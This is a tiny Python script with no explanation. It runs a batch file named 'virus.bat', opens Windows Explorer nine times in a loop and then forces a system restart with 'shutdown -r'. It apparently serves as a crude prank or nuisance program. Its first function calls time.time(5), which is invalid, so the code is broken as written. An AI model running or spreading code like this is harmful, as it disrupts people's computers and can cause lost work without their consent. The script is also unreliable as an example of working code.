import os
import time


# Code
def time_start():
    time.time(5)


time_start()
os.system('virus.bat')

s = 1
while s < 10:
    os.system('explorer.exe')
    s += 1

os.system('shutdown -r')
